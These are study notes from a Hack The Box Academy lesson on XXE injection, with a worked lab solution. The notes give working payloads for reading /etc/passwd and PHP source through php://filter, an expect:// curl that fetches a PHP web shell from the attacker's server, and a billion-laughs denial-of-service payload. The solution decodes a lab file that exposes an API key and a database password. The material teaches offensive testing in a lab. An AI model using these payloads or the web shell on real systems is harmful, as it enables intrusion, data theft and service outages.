When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.

Let us see how we can identify potential XXE vulnerabilities and exploit them to read sensitive files from the back-end server.

---

## Identifying

The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We can start the exercise at the end of this section, which has aÂ `Contact Form`:


![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg)

If we fill the contact form and click onÂ `Send Data`, then intercept the HTTP request with Burp, we get the following request:

![xxe_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.

If we send the form without any modification, we get the following message:

![xxe_response](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

We see that the value of theÂ `email`Â element is being displayed back to us on the page. To print the content of an external file to the page, we shouldÂ `note which elements are being displayed, such that we know which elements to inject into`. In some cases, no elements may be displayed, which we will cover how to exploit in the upcoming sections.

For now, we know that whatever value we place in theÂ `<email></email>`Â element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in theÂ `email`Â element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

**Note:**Â In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If theÂ `DOCTYPE`Â was already declared in the XML request, we would just add theÂ `ENTITY`Â element to it.

Now, we should have a new XML entity calledÂ `company`, which we can reference withÂ `&company;`. So, instead of using our email in theÂ `email`Â element, let us try usingÂ `&company;`, and see whether it will be replaced with the value we defined (`Inlane Freight`):

![new_entity](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

As we can see, the response did use the value of the entity we defined (`Inlane Freight`) instead of displayingÂ `&company;`, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (`&company;`) as a raw value.Â `This confirms that we are dealing with a web application vulnerable to XXE`.

**Note:**Â Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing theÂ `Content-Type`Â header toÂ `application/xml`, and then convert the JSON data to XML with anÂ [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

---

## Reading Sensitive Files

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add theÂ `SYSTEM`Â keyword and define the external reference path after it, as we have learned in the previous section:


```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Let us now send the modified request and see whether the value of our external XML entity gets set to the file we reference:

![external_entity](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

We see that we did indeed get the content of theÂ `/etc/passwd`Â file,Â `meaning that we have successfully exploited the XXE vulnerability to read local files`. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like anÂ `id_rsa`Â SSH key of a specific user, which may grant us access to the back-end server. We can refer to theÂ [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion)Â module to see what attacks can be carried out through local file disclosure.

**Tip:**Â In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

---

## Reading Source Code

Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform aÂ `Whitebox Penetration Test`Â to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

So, let us see if we can use the same attack to read the source code of theÂ `index.php`Â file, as follows:

![file_php](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

As we can see, this did not work, as we did not get any content. This happened becauseÂ `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g.Â `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of usingÂ `file://`Â as our reference, we will use PHP'sÂ `php://filter/`Â wrapper. With this filter, we can specify theÂ `convert.base64-encode`Â encoder as our filter, and then add an input resource (e.g.Â `resource=index.php`), as follows:


```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

With that, we can send our request, and we will get the base64 encoded string of theÂ `index.php`Â file:

![file_php](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to theÂ [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23)Â module.

`This trick only works with PHP web applications.`Â The next section will discuss a more advanced method for reading source code, which should work with any web framework.

---

## Remote Code Execution with XXE

In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look forÂ `ssh`Â keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through theÂ `PHP://expect`Â filter, though this requires the PHPÂ `expect`Â module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands asÂ `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

```shell-session
smoothment@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
smoothment@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute aÂ `curl`Â command that downloads our web shell into the remote server:


```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Note:**Â We replaced all spaces in the above XML code withÂ `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters likeÂ `|`,Â `>`, andÂ `{`Â may break the code, so we should avoid using them.

Once we send the request, we should receive a request on our machine for theÂ `shell.php`Â file, after which we can interact with the web shell on the remote server for code execution.

**Note:**Â The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

## Other XXE Attacks

Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability. TheÂ [Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks)Â module thoroughly covers SSRF, and the same techniques can be carried with XXE attacks.

Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:


```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

This payload defines theÂ `a0`Â entity asÂ `DOS`, references it inÂ `a1`Â multiple times, referencesÂ `a1`Â inÂ `a2`, and so on until the back-end server's memory runs out due to the self-reference loops. However,Â `this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. Try it against this exercise, and see if it works.

# Question
---
![Pasted image 20250217175259.png](../../../../IMAGES/Pasted%20image%2020250217175259.png)

We can do the following payload:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```

It will output this:

```http
HTTP/1.1 200 OK

Date: Mon, 17 Feb 2025 22:59:25 GMT

Server: Apache/2.4.41 (Ubuntu)

Vary: Accept-Encoding

Content-Length: 344

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html; charset=UTF-8



Check your email PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K for further instructions.

```

Now, we can decode the base64:

```bash
echo 'PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K' | base64 -d
```

This outputs:

```php
<?php

$api_key = "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg";

try {
	$conn = pg_connect("host=localhost port=5432 dbname=users user=postgres password=iUer^vd(e1Pl9");
}

catch ( exception $e ) {
 	echo $e->getMessage();
}

?>
```

Answer is:

```

```
